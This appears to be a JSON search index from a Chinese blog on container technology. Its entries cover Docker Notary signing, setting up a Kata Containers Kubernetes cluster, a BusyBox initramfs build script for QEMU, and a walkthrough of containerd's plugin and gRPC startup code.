可见这个image已经不被信任了，无法pull和运行非法image。\n3.5 docker content trust的问题 镜像是先与Registry打交道后存储签名，如果是恶意image覆盖的问题，会导致恶意image上传上去了，但是签名没有更新/被删除的问题，导致image和notary签名数据不一致。需要加事务来解决？ 密钥的存储必须与KMS结合起来，这样就不能直接使用docker+notary的解决方案了，预计要重新实现docker client的签名和验证功能? ","link":"https://weizhang555.github.io/post/notary-intro/","section":"post","tags":["容器","安全"],"title":"Docker官方镜像签名方案：Notary"},{"body":"本文介绍下如何创建kata的k8s集群， kata项目链接：https://github.com/kata-containers kata是什么不介绍了，能看到这篇文章的相信对kata都已经有一定了解了。\n本文参考了官方的安装说明： https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md 实际上仅仅安装没有什么好讲的，文档里讲的很清楚了。但是在我们恶劣的大网络环境下，就变得有点技巧了。\n安装环境 安装kata-containers 安装docker 安装cri-containerd step 0: 安装依赖 step 1: 下载containerd的tar包： 安装cni插件 安装环境 Virtual Machine:\nOS: Ubuntu 18.04\nCPU: 4\nMemory: 8G\n在虚拟化环境中，务必保证嵌套虚拟化打开。\n虚拟化软件必须要支持 可以在guest OS里面通过以下命令检查：\n1$ sudo grep -E \u0026#34;(vmx|svm)\u0026#34; --color=always /proc/cpuinfo 如果没有显示则不支持硬件虚拟化。需要打开相应的虚拟化选项，如果是物理机则需要bios里面启用虚拟化支持。\n启动kvm_intel的嵌套虚拟化支持 1# modprobe -r kvm_intel 2# modprobe kvm_intel nested=1 安装kata-containers 参考：\nhttps://github.com/kata-containers/documentation/blob/master/install/ubuntu-installation-guide.md\n运行以下命令：\n1$ sudo sh -c \u0026#34;echo \u0026#39;deb http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/ /\u0026#39; \u0026gt; /etc/apt/sources.list.d/kata-containers.list\u0026#34; 2$ curl -sL http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/Release.key | sudo apt-key add - 3$ sudo -E apt-get update 4$ sudo -E apt-get -y install kata-runtime kata-proxy kata-shim 安装docker 参考：\nhttps://github.com/kata-containers/documentation/blob/master/install/docker/ubuntu-docker-install.md\n实际上在本文写成之时，k8s+docker+kata的路子还没走通，必须依赖一个将annotation透传的补丁：\nPR: https://github.com/moby/moby/pull/37289\ndocker公司一向强势，这个pr虽然很有用，但是也不知道还要多久才会被合入。\n所以本文运行kata的k8s集群使用的是cri-containerd而不是docker。\n不过笔者仍然建议先安装docker，来尝试kata-containers。你可以简单的运行以下命令：\n1$ docker run -ti --runtime kata busybox sh 2# 运行成功后可以通过 ps -ef | grep qemu 来查看kata-containers后台对应的qemu进程。\n安装cri-containerd 参考： https://github.com/containerd/cri/blob/master/docs/installation.md\nstep 0: 安装依赖 1$ sudo apt-get update 2$ sudo apt-get install libseccomp2 step 1: 下载containerd的tar包： 1export VERSION=1.1.2 2$ wget https://storage.googleapis.com/cri-containerd-release/cri-containerd-${VERSION}.linux-amd64.tar.gz 这一步就要用到翻墙大法了，翻墙流量也会费钱的，所以给大家提供个网盘链接吧：\n安装cni插件 这里简化一下，使用标准的cni插件。\n参考： https://github.com/containernetworking/cni\n1$ git clone https://github.com/containernetworking/plugins 2$ cd plugins 3$ ./build.sh 4$ mkdir -p /etc/cni/net.d 5$ cat \u0026gt;/etc/cni/net.d/10-mynet.conf \u0026lt;\u0026lt;EOF 6{ 7\t\u0026#34;cniVersion\u0026#34;: \u0026#34;0.2.0\u0026#34;, 8\t\u0026#34;name\u0026#34;: \u0026#34;mynet\u0026#34;, 9\t\u0026#34;type\u0026#34;: \u0026#34;bridge\u0026#34;, 10\t\u0026#34;bridge\u0026#34;: \u0026#34;cni0\u0026#34;, 11\t\u0026#34;isGateway\u0026#34;: true, 12\t\u0026#34;ipMasq\u0026#34;: true, 13\t\u0026#34;ipam\u0026#34;: { 14\t\u0026#34;type\u0026#34;: \u0026#34;host-local\u0026#34;, 15\t\u0026#34;subnet\u0026#34;: \u0026#34;10.22.0.0/16\u0026#34;, 16\t\u0026#34;routes\u0026#34;: [ 17\t{ \u0026#34;dst\u0026#34;: \u0026#34;0.0.0.0/0\u0026#34; } 18\t] 19\t} 20} 21EOF 22$ cat \u0026gt;/etc/cni/net.d/99-loopback.conf \u0026lt;\u0026lt;EOF 23{ 24\t\u0026#34;cniVersion\u0026#34;: \u0026#34;0.2.0\u0026#34;, 25\t\u0026#34;name\u0026#34;: \u0026#34;lo\u0026#34;, 26\t\u0026#34;type\u0026#34;: \u0026#34;loopback\u0026#34; 27} 28EOF ","link":"https://weizhang555.github.io/post/create-k8s-cluster-with-kata/","section":"post","tags":["容器","K8s"],"title":"创建kata的K8s集群"},{"body":"通过自己制作initramfs可以使用qemu启动自定义的内核， 可以用于调试或测试。这里记录一下制作简单的initramfs的脚本， 方便后续使用。\n本文参考了链接：Building a minimal Linux / Busybox OS for Qemu\n完整脚本如下：\n1#!/bin/bash 2set -e 3 4CWD=`pwd` 5BUSYBOX_FILE=busybox-1.28.1 6BUSYBOX_SRC=/tmp/busybox 7BUSYBOX_BUILD=/tmp/busybox-build 8INITRAMFS_DIR=/tmp/initramfs 9 10mkdir -p $BUSYBOX_SRC $BUSYBOX_BUILD $INITRAMFS_DIR 11if [ ! -e $BUSYBOX_FILE ]; then 12 wget http://busybox.net/downloads/${BUSYBOX_FILE}.tar.bz2 13fi 14tar -C $BUSYBOX_SRC -xvf ${BUSYBOX_FILE}.tar.bz2 15 16cd ${BUSYBOX_SRC}/${BUSYBOX_FILE} \u0026amp;\u0026amp; make O=${BUSYBOX_BUILD} defconfig 17# enable busybox static build 18cd ${BUSYBOX_BUILD} \u0026amp;\u0026amp; sed -i \u0026#34;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/\u0026#34; .config \\ 19 \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 20 21cd $INITRAMFS_DIR \u0026amp;\u0026amp; rm -rfv * \u0026amp;\u0026amp; mkdir -p bin sbin etc proc sys usr/bin usr/sbin \\ 22 \u0026amp;\u0026amp; cp -a $BUSYBOX_BUILD/_install/* . 23 24# if you want to add iozone binary and its linked .so, you can add command here: 25# cp iozone $INITRAMFS_DIR/bin 26 27cat \u0026gt; $INITRAMFS_DIR/init \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; 28#!/bin/sh 29 30mount -t proc none /proc 31mount -t sysfs none /sys 32 33cat \u0026lt;\u0026lt;! 34 35 36Boot took $(cut -d\u0026#39; \u0026#39; -f1 /proc/uptime) seconds 37 38 _ _ __ _ 39 /\\/\\ (_)_ __ (_) / /(_)_ __ _ ___ __ 40 / \\| | \u0026#39;_ \\| | / / | | \u0026#39;_ \\| | | \\ \\/ / 41/ /\\/\\ \\ | | | | | / /__| | | | | |_| |\u0026gt; \u0026lt; 42\\/ \\/_|_| |_|_| \\____/_|_| |_|\\__,_/_/\\_\\ 43 44 45Welcome to mini_linux 46 47 48! 49exec /bin/sh 50EOF 51 52chmod +x init 53 54# package into a initramfs 55rm -fv /tmp/initramfs.cpio.gz || true 56find . -print0 | cpio --null -ov --format=newc \\ 57 | gzip -9 \u0026gt; /tmp/initramfs.cpio.gz 58 59echo \u0026#34;===========\u0026gt; initramfs is saved as /tmp/initramfs.cpio.gz\u0026#34; 60 61cd ${CWD} 62# boot with qemu 63# sudo qemu-system-x86_64 -enable-kvm -kernel build/kernel -initrd initramfs.cpio.gz -nographic -append \u0026#34;console=ttyS0\u0026#34; ","link":"https://weizhang555.github.io/post/make-initramfs-for-qemu-start/","section":"post","tags":["内核"],"title":"Kernel调试基础--制作initramfs"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%86%85%E6%A0%B8/","section":"tags","tags":null,"title":"内核"},{"body":"","link":"https://weizhang555.github.io/tags/kata/","section":"tags","tags":null,"title":"Kata"},{"body":"最近在51cto举办的meetup上做了关于Kata Containers的演讲， KataContainers是github上的新项目，前身是Intel的clear container和Hyper的runv， 融合了普通容器的轻快和虚拟机的高隔离高安全性的优点。\n详细可以直接参观Kata Containers的github主页： https://github.com/kata-containers/runtime\n演讲的链接传送门：http://developer.huawei.com/ict/forum/thread-48823.html\n完整的演讲ppt可以在此处下载： Kata介绍与Huawei_iSula安全容器-张伟.ppt\n","link":"https://weizhang555.github.io/post/kata-containers-introduction/","section":"post","tags":["容器","安全","Kata"],"title":"Kata Containers介绍，附上演讲ppt"},{"body":" 1. 简介 2. grpc 3. containerd启动 4. 总结 1. 简介 containerd是与docker直接沟通的下属组件，详细是什么不说了。 每个docker daemon启动的时候都会启动一个containerd daemon，启动容器的时候， 每个容器的init进程／exec进程都会对应一个containerd-shim进程， containerd-shim同样是containerd库里面单独的一个二进制程序， containerd-shim会调用runc最终启动容器。 这些基本的知识一笔带过不详细展开。\n随着docker改名为moby，docker的大部分功能，比如image管理，容器运行都会下沉到containerd， docker会越来越侧重于编排调度部分--swarm。\n简单分析下containerd的代码架构，作为官方containerd文档的一个补充。 本篇以git commit d700a9c35b09239c8c056cd5df73bc19a79db9a9 为标准讲解。\n2. grpc containerd的架构极其依赖grpc协议。\n1# ls api/services/ 2containers content diff events images namespaces snapshot tasks version api/services目录下存放着containerd提供的不同服务对应的grpc接口。 以比较基础的content服务为例，\n1# ls api/services/content/v1/ 2content.pb.go content.proto 下面一共有两个文件，一个content.proto一个是.pb.go, 其中用户只需要定义content.proto文件， 而程序最终使用的content.pb.go则可以由grpc命令自动生成。 containerd在Makefile中提供了生成.pb.go的指令\n1// 安装依赖的库 2# cd containerd \u0026amp;\u0026amp; make setup 3# make protos 打开content.proto 来看，里面主要定义了一个service：\n113 service Content { 2 14 // Info returns information about a committed object. 3 15 // 4 16 // This call can be used for getting the size of content and checking for 5 17 // existence. 6 18 rpc Info(InfoRequest) returns (InfoResponse); 7 19 8 20 // Update updates content metadata. 9 21 // 10 22 // This call can be used to manage the mutable content labels. The 11 23 // immutable metadata such as digest, size, and committed at cannot 12 24 // be updated. 13 25 rpc Update(UpdateRequest) returns (UpdateResponse); 14 26 15 27 // List streams the entire set of content as Info objects and closes the 16 28 // stream. 17 29 // 18 30 // Typically, this will yield a large response, chunked into messages. 19 31 // Clients should make provisions to ensure they can handle the entire data 20 32 // set. 21 33 rpc List(ListContentRequest) returns (stream ListContentResponse); 22 34 23 35 // Delete will delete the referenced object. 24 36 rpc Delete(DeleteContentRequest) returns (google.protobuf.Empty); 25...省略... 以及很多message结构体，message可以理解成是service定义的接口使用到的结构体，是通信的结构化的数据流。\n使用protoc命令生成的.pb.go文件内同步包含server端和client端的接口实现。\n3. containerd启动 以containerd启动过程来看。入口为cmd/containerd/main.go, 程序一启动首先就把信号处理函数准备好了。\n1cmd/containerd/main.go: 2 85 done := handleSignals(ctx, signals, serverC) 3 86 // start the signal handler as soon as we can to make sure that 4 87 // we don\u0026#39;t miss any signals during boot 5 88 signal.Notify(signals, handledSignals...) 后面都是准备并启动grpc server。核心是准备server的这一句\n1cmd/containerd/main.go: 2106\tserver, err := server.New(ctx, config) 进去来看server.New的实现。\n前面都是创建目录，主要看加载plugin的部分。\n3.1. load plugins 1server/server.go: 2func New(ctx context.Context, config *Config) (*Server, error): 3 452 plugins, err := loadPlugins(config) 核心代码：\n1162 func loadPlugins(config *Config) ([]*plugin.Registration, error) { 2163 // load all plugins into containerd 3164 if err := plugin.Load(filepath.Join(config.Root, \u0026#34;plugins\u0026#34;)); err != nil { 4165 return nil, err 5166 } 6167 // load additional plugins that don\u0026#39;t automatically register themselves 7168 plugin.Register(\u0026amp;plugin.Registration{ 8169 Type: plugin.ContentPlugin, // \u0026#34;io.containerd.content.v1\u0026#34; 9170 ID: \u0026#34;content\u0026#34;, 10171 Init: func(ic *plugin.InitContext) (interface{}, error) { 11172 return local.NewStore(ic.Root) 12173 }, 13174 }) 14175 plugin.Register(\u0026amp;plugin.Registration{ 15176 Type: plugin.MetadataPlugin, // \u0026#34;io.containerd.metadata.v1\u0026#34; 16177 ID: \u0026#34;bolt\u0026#34;, 17178 Init: func(ic *plugin.InitContext) (interface{}, error) { 18179 if err := os.MkdirAll(ic.Root, 0711); err != nil { 19180 return nil, err 20181 } 21182 return bolt.Open(filepath.Join(ic.Root, \u0026#34;meta.db\u0026#34;), 0644, nil) 22183 }, 23184 }) 24185 25186 // return the ordered graph for plugins 26187 return plugin.Graph(), nil 27188 } 164行进入plugin包，内部实现是golang从1.8（？）开始支持的新特性--go语言自带的plugin支持， 可以加载用户自定义的插件。\n168和175是注册了两个最基本的插件，一个是content插件，一个是metadata插件，这两个插件基本上是其他插件的基础。 其中content插件主要是依赖content/local那个子package，metadata主要是操纵boltdb数据库meta.db\n1root@ubuntu:~/gocode/src/github.com/containerd/containerd# ls /var/lib/containerd/ 2io.containerd.content.v1.content io.containerd.runtime.v1.linux io.containerd.snapshotter.v1.overlayfs 3io.containerd.metadata.v1.bolt io.containerd.snapshotter.v1.btrfs 4root@ubuntu:~/gocode/src/github.com/containerd/containerd# ls /var/lib/containerd/io.containerd.metadata.v1.bolt/ 5meta.db plugin.Register函数其实很简单，就是把某个Registration结构体加入到plugin包的register全局结构体内：\n1 59 var register = struct { 2 60 sync.Mutex 3 61 r []*Registration 4 62 }{} 上面的r即承载着所有的Registration结构体。\n上文中提到的loadPlugins最后return plugin.Graph()同样定义在plugin包里， 里面根据Registration.Requires对所有Registration进行了排序， 给出了一个按依赖关系排序的插件数组。比方说plugin a, b, c, 其中b定义了requires a, c定义了requires b, 那么最终给出的排序的插件数组就是[a, b, c] 而不是[b, a, c]或其他。\n但是Registration难道只有两个吗？两个插件为什么需要这么复杂？ 答案是当然不是只有两个，还有其他的插件，只是他们初始化过程比较隐晦，不是那么直观。\n3.2. 其他插件在哪儿？ 答案是在以下两个文件中：\n1cmd/containerd/builtins.go: 2 3 // register containerd builtins here 3 4 import ( 4 5 _ \u0026#34;github.com/containerd/containerd/differ\u0026#34; 5 6 _ \u0026#34;github.com/containerd/containerd/services/containers\u0026#34; 6 7 _ \u0026#34;github.com/containerd/containerd/services/content\u0026#34; 7 8 _ \u0026#34;github.com/containerd/containerd/services/diff\u0026#34; 8 9 _ \u0026#34;github.com/containerd/containerd/services/events\u0026#34; 9 10 _ \u0026#34;github.com/containerd/containerd/services/healthcheck\u0026#34; 10 11 _ \u0026#34;github.com/containerd/containerd/services/images\u0026#34; 11 12 _ \u0026#34;github.com/containerd/containerd/services/namespaces\u0026#34; 12 13 _ \u0026#34;github.com/containerd/containerd/services/snapshot\u0026#34; 13 14 _ \u0026#34;github.com/containerd/containerd/services/tasks\u0026#34; 14 15 _ \u0026#34;github.com/containerd/containerd/services/version\u0026#34; 15 16 ) 以及(以linux平台为例，其他平台的文件见其他后缀文件)：\n1cmd/containerd/builtins_linux.go: 2 3 import ( 3 4 _ \u0026#34;github.com/containerd/containerd/linux\u0026#34; 4 5 _ \u0026#34;github.com/containerd/containerd/metrics/cgroups\u0026#34; 5 6 _ \u0026#34;github.com/containerd/containerd/snapshot/overlay\u0026#34; 6 7 ) 其中import _ \u0026quot;xxx\u0026quot; 就代表着只执行这个包的init函数，但是不使用这个包的任何函数。\n以services/content为例：\n1services/content/service.go: 2 38 func init() { 3 39 plugin.Register(\u0026amp;plugin.Registration{ 4 40 Type: plugin.GRPCPlugin, // \u0026#34;io.containerd.grpc.v1\u0026#34; 5 41 ID: \u0026#34;content\u0026#34;, 6 42 Requires: []plugin.PluginType{ 7 43 plugin.ContentPlugin, 8 44 plugin.MetadataPlugin, 9 45 }, 10 46 Init: NewService, 11 47 }) 12 48 } init()函数是golang的基本用法，会在这个package被引用到的时候自动初始化执行。 这里就是注册了另一个plugin. 需要注意的是，plugin.GRPCPlugin这个类型的插件有不止一种，一般都是通过grpc service对外提供服务的。 在上面提到的import的其他包里，你可以找到很多GRPCPlugin类型的插件。 这个插件依赖于plugin.ContentPlugin和plugin.MetadataPlugin， 也就是说初始化过程中，一定会先初始化它依赖的ContentPlugin和MetadataPlugin再初始化它。 Init函数指向NewService这个函数。这个函数本文后面会继续打开来看，我们先暂停到这里。 到此，我们知道了所有plugin都是在哪里找到的。\n3.3. 注册和启动service 继续回到server.New的实现中，loadPlugins完成之后，所有的plugin都加入到plugins这个数组中了， 下一步就是处理这个数组。下面是一段长长的代码：\n1server/server.go: 2func New(ctx context.Context, config *Config) (*Server, error): 3 4 68 for _, p := range plugins { 5 69 id := p.URI() // fmt.Sprintf(\u0026#34;%s.%s\u0026#34;, r.Type, r.ID) 6 70 log.G(ctx).WithField(\u0026#34;type\u0026#34;, p.Type).Infof(\u0026#34;loading plugin %q...\u0026#34;, id) 7 71 8 72 initContext := plugin.NewContext( 9 73 ctx, 10 74 initialized, 11 75 config.Root, // 默认是\u0026#34;/var/lib/containerd\u0026#34; 12 76 config.State, // 默认是\u0026#34;/run/containerd\u0026#34; 13 77 id, 14 78 ) 15 79 initContext.Events = s.events 16 80 initContext.Address = config.GRPC.Address // 默认是\u0026#34;/run/containerd/containerd.sock\u0026#34; 17 81 18 82 // load the plugin specific configuration if it is provided 19 83 if p.Config != nil { 20 84 pluginConfig, err := config.Decode(p.ID, p.Config) 21 85 if err != nil { 22 86 return nil, err 23 87 } 24 88 initContext.Config = pluginConfig 25 89 } 26 90 instance, err := p.Init(initContext) 27 91 if err != nil { 28 92 if plugin.IsSkipPlugin(err) { 29 93 log.G(ctx).WithField(\u0026#34;type\u0026#34;, p.Type).Infof(\u0026#34;skip loading plugin %q...\u0026#34;, id) 30 94 } else { 31 95 log.G(ctx).WithError(err).Warnf(\u0026#34;failed to load plugin %s\u0026#34;, id) 32 96 } 33 97 continue 34 98 } 35 99 36100 if types, ok := initialized[p.Type]; ok { 37101 types[p.ID] = instance 38102 } else { 39103 initialized[p.Type] = map[string]interface{}{ 40104 p.ID: instance, 41105 } 42106 } 43107 // check for grpc services that should be registered with the server 44108 if service, ok := instance.(plugin.Service); ok { 45109 services = append(services, service) 46110 } 47111 } 48112 // register services after all plugins have been initialized 49113 for _, service := range services { 50114 if err := service.Register(rpc); err != nil { 51115 return nil, err 52116 } 53117 } 90行之前都是准备initContext，这个initContext是会传递给每个plugin的Init函数使用的一个初始化数据。 随后重点是90行，会调用每个plugin的Init函数，入参为刚才准备的initContext。 initialized数组每一轮迭代都会把当前初始化完成的插件放进去，然后传递给下一个plugin的initContext作为初始化必须的数据， 下一个插件就可以访问它所依赖的任何一个组件了。\n108行需要注意的是，每个插件执行完Init函数所返回的instance interface，都会尝试去转换成plugin.Service接口， 如果它实现了plugin.Service这个接口，那么它就是一个service，需要加到services列表， 等待最后在114行执行Register函数进行注册。\n1plugin/plugin.go: 2 55 type Service interface { 3 56 Register(*grpc.Server) error 4 57 } 也即是说，只要instance实现了Register接口，就是一个服务。\n仍然以content service为例。\n1services/content/service.go: 2 38 func init() { 3 39 plugin.Register(\u0026amp;plugin.Registration{ 4 40 Type: plugin.GRPCPlugin, 5 41 ID: \u0026#34;content\u0026#34;, 6 42 Requires: []plugin.PluginType{ 7 43 plugin.ContentPlugin, 8 44 plugin.MetadataPlugin, 9 45 }, 10 46 Init: NewService, 11 47 }) 12 48 } 13 49 14 50 func NewService(ic *plugin.InitContext) (interface{}, error) { 15 51 c, err := ic.Get(plugin.ContentPlugin) 16 52 if err != nil { 17 53 return nil, err 18 54 } 19 55 m, err := ic.Get(plugin.MetadataPlugin) 20 56 if err != nil { 21 57 return nil, err 22 58 } 23 59 cs := metadata.NewContentStore(m.(*bolt.DB), c.(content.Store)) 24 60 return \u0026amp;Service{ 25 61 store: cs, 26 62 publisher: ic.Events, 27 63 }, nil 28 64 } 29 65 30 66 func (s *Service) Register(server *grpc.Server) error { 31 67 api.RegisterContentServer(server, s) 32 68 return nil 33 69 } 可以看到content plugin的Init函数返回了content.Service结构体，这个结构体实现了Register函数， 它是一个service。 其中67行会跳转到以下：\n1api/services/content/v1/content.pb.go: 2 619 // Server API for Content service 3 620 4 621 type ContentServer interface { 5 622 // Info returns information about a committed object. 6 623 // 7 624 // This call can be used for getting the size of content and checking for 8 625 // existence. 9 626 Info(context.Context, *InfoRequest) (*InfoResponse, error) 10 627 // Update updates content metadata. 11 628 // 12 629 // This call can be used to manage the mutable content labels. The 13 630 // immutable metadata such as digest, size, and committed at cannot 14 631 // be updated. 15 632 Update(context.Context, *UpdateRequest) (*UpdateResponse, error) 16 633 // List streams the entire set of content as Info objects and closes the 17 634 // stream. 18 635 // 19 636 // Typically, this will yield a large response, chunked into messages. 20 637 // Clients should make provisions to ensure they can handle the entire data 21 638 // set. 22 639 List(*ListContentRequest, Content_ListServer) error 23 640 // Delete will delete the referenced object. 24 641 Delete(context.Context, *DeleteContentRequest) (*google_protobuf3.Empty, error) 25...省略... 26 27 677 func RegisterContentServer(s *grpc.Server, srv ContentServer) { 28 678 s.RegisterService(\u0026amp;_Content_serviceDesc, srv) 29 679 } 也就是content.Service必须是ContentServer的一个实现。\n下面一句划重点：\napi/services包定义了所有用户自定义的grpc服务的接口，其中.proto文件包含了用户自定义的service接口， 而.pb.go是protoc自动生成的service定义，包含server端和client端定义；services/包里实现了api/services/用户定义的接口\napi/services包含的是接口定义，services包是实现。\n在上文中services/content/service.go包含了content service的server端实现，而services/content/store.go对client端做了封装， 更加便于使用。\n4. 总结 上文对containerd的启动流程做了总结，主要是围绕containerd如何启动多个grpc service给出分析的。grpc可以说是containerd的实现核心， 与docker daemon的http restful API还是有较大不同。后续会针对部分单独的组件再来做分析。\ncontainerd源码分析xmind文件\n","link":"https://weizhang555.github.io/post/containerd-code-analysis/","section":"post","tags":["容器"],"title":"containerd源码阅读(1)--框架篇"},{"body":"runc是docker的核心底层依赖，是容器运行的runtime，目前所属的仓库是opencontainers/runc, 是docker将原先的libcontainer模块独立出来，并贡献给oci社区的产物。\n一直想写一下runc的源码分析，但是一直没有时间。暂时先把自己阅读runc过程中画得xmind思维脑图放出来吧， 里面的内容是runc的代码流程分析。有时间再回来补齐源码分析。\nrunc源码分析xmind文件\n","link":"https://weizhang555.github.io/post/runc-code-analysis/","section":"post","tags":["容器"],"title":"runc源码阅读"},{"body":"我是谁？ 一位热爱生活，热爱coding的普通人。\n联系我 Email: zhangwei_cs@qq.com\nWeChat(微信): zhangwei_cs\n“长弓二十九”是什么意思？ 因为全国叫“张伟”的人有二十九万之多。\nhttps://www.toutiao.com/article/6783971757482050061/?source=seo_tt_juhe\n2019年全国姓名报告：“张伟”有近30万人，全国最多\n","link":"https://weizhang555.github.io/about/","section":"","tags":null,"title":"关于我"},{"body":"之前也在其他地方开过博客，每次都坚持不了多久，零零散散写一些，回头看一下没多少有价值的东西。 这次搬家到github pages上面，算是个新的开始，旧的东西就随风而去吧，不带过来了。\n从今天开始，尽量腾点时间，多写点技术文章，不在乎长度，不必刻意追求深度，尽量多留下点东西。\n目前在研究容器领域的东西，就多写点docker容器相关的文章吧。\n共勉。\n","link":"https://weizhang555.github.io/post/start/","section":"post","tags":["随手"],"title":"起个头"},{"body":"","link":"https://weizhang555.github.io/tags/%E9%9A%8F%E6%89%8B/","section":"tags","tags":null,"title":"随手"},{"body":"","link":"https://weizhang555.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://weizhang555.github.io/series/","section":"series","tags":null,"title":"Series"}]